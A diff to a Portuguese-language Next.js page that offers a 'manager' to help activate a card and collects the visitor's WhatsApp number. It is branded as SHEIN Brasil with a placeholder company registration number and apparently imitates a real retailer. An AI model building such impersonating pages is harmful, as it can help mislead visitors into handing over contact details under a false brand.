@@ -5,12 +5,11 @@ import type React from "react"
 import { useState } from "react"
 import { useRouter } from "next/navigation"
 import Image from "next/image"
-import { Trophy } from "lucide-react"
 
 export default function ManagerPage() {
+  const router = useRouter()
   const [whatsapp, setWhatsapp] = useState("")
   const [isValid, setIsValid] = useState(false)
-  const router = useRouter()
 
   // Função para formatar WhatsApp
   const formatWhatsApp = (value: string) => {
@@ -18,15 +17,15 @@ export default function ManagerPage() {
     const numbers = value.replace(/\D/g, "")
 
     // Limita a 11 dígitos
-    const limited = numbers.substring(0, 11)
+    const limited = numbers.slice(0, 11)
 
-    // Aplica a formatação (XX) XXXXX-XXXX
+    // Aplica a máscara (XX) XXXXX-XXXX
     if (limited.length <= 2) {
       return limited
     } else if (limited.length <= 7) {
-      return `(${limited.substring(0, 2)}) ${limited.substring(2)}`
+      return `(${limited.slice(0, 2)}) ${limited.slice(2)}`
     } else {
-      return `(${limited.substring(0, 2)}) ${limited.substring(2, 7)}-${limited.substring(7)}`
+      return `(${limited.slice(0, 2)}) ${limited.slice(2, 7)}-${limited.slice(7)}`
     }
   }
 
@@ -44,11 +43,11 @@ export default function ManagerPage() {
 
   const handleContinue = () => {
     if (isValid) {
-      // Salva o WhatsApp no localStorage
+      // Salvar WhatsApp no localStorage
       const numbers = whatsapp.replace(/\D/g, "")
-      localStorage.setItem("whatsapp", numbers)
+      localStorage.setItem("managerWhatsApp", numbers)
 
-      // Redireciona para a próxima página
+      // Redirecionar para delivery-method
       router.push("/delivery-method")
     }
   }
@@ -63,6 +62,7 @@ export default function ManagerPage() {
             Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
           </p>
 
+          {/* Manager Card */}
           <div className="bg-[#fff7db] border border-[#ffbf00] rounded-xl p-5 pb-3 mb-5">
             <div className="flex justify-center mb-3">
               <Image
@@ -80,17 +80,36 @@ export default function ManagerPage() {
 
             <div className="flex justify-center mt-0">
               <div className="bg-[#ffbf00] text-white px-3 py-1 rounded-full text-xs font-bold flex items-center">
-                <Trophy className="w-3 h-3 mr-1" />
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  className="w-3 h-3 mr-1"
+                >
+                  <path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path>
+                  <path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path>
+                  <path d="M4 22h16"></path>
+                  <path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"></path>
+                  <path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"></path>
+                  <path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"></path>
+                </svg>
                 Melhor gerente 2021-2024
               </div>
             </div>
           </div>
 
+          {/* WhatsApp Input */}
           <div className="flex items-center justify-center mb-2">
             <Image src="/whatsapp-icon.png" alt="WhatsApp" width={20} height={20} className="mr-3" />
             <input
               type="tel"
-              className="flex h-10 w-full px-3 py-2 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 flex-1"
+              className="flex h-10 w-full px-3 py-2 border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 flex-1 focus:outline-none"
               placeholder="Digite seu WhatsApp aqui"
               maxLength={15}
               style={{
@@ -105,20 +124,20 @@ export default function ManagerPage() {
             />
           </div>
 
+          {/* Continue Button */}
           <button
-            className={`inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 w-full font-bold py-4 px-6 rounded-lg text-base transition-colors ${
-              isValid
-                ? "bg-black text-white hover:bg-black/90"
-                : "bg-gray-300 text-gray-500 cursor-not-allowed hover:bg-gray-300"
-            }`}
-            disabled={!isValid}
             onClick={handleContinue}
+            disabled={!isValid}
+            className={`w-full font-bold py-4 px-6 rounded-lg text-base transition-colors ${
+              isValid ? "bg-black text-white hover:bg-gray-800" : "bg-gray-300 text-gray-500 cursor-not-allowed"
+            }`}
           >
             Continuar
           </button>
         </div>
       </div>
 
+      {/* Footer */}
       <footer className="bg-[#f9f9f9] border-t border-[#eaeaea] px-4 py-6 text-center mt-12">
         <div className="max-w-2xl mx-auto">
           <p className="text-gray-600 text-xs mb-1 leading-tight">SHEIN Brasil LTDA | CNPJ: 12.345.678/0001-99</p>
